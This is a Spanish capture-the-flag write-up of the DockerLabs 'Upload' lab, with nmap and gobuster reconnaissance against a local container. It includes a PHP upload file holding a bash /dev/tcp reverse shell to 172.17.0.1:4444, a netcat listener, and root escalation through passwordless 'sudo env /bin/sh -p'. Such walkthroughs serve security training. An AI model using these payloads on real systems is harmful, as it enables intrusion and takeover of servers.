---
title: "DockerLabs - Upload"
difficulty: "Fácil"
source: "DockerLabs"
---

Panel vulnerable de subida de archivos, donde se puede subir código malicioso y conseguir ejecución remota de comandos en el servidor.

## Reconocimiento

Comenzamos con un mapeo de red:

```bash
nmap -sCV -p- 172.17.0.2
```

Muestra Apache en el puerto 80. Al entrar, vemos la clásica interfaz de "upload file", por lo que nuestro vector de ataque será subir un fichero malicioso.

Primero, listamos directorios para ver qué encontramos:

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x php,html,zip,bak,txt,py,xml,log -t 40
```

Encontramos `http://172.17.0.2/uploads`, que muestra el directorio de archivos subidos.

## Explotación

Creamos un script malicioso para obtener una reverse shell:

```bash
cat << 'EOF' > shell.php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'"); ?>
EOF
```

Abrimos un puerto con `netcat`, subimos el fichero y lo ejecutamos desde el directorio de archivos subidos para obtener acceso:

```bash
nc -lvnp 4444
```

Acceso conseguido como usuario `www-data`.

## Escalada de privilegios

Comprobamos si tenemos algún comando permitido como sudo:

```bash
sudo -l
```

Podemos ejecutar `env` como sudo sin contraseña, así que lo usamos para obtener acceso a root:

```bash
sudo env /bin/sh -p
whoami
```

## Conclusión

Objetivo conseguido: acceso a root obtenido. Laboratorio terminado.
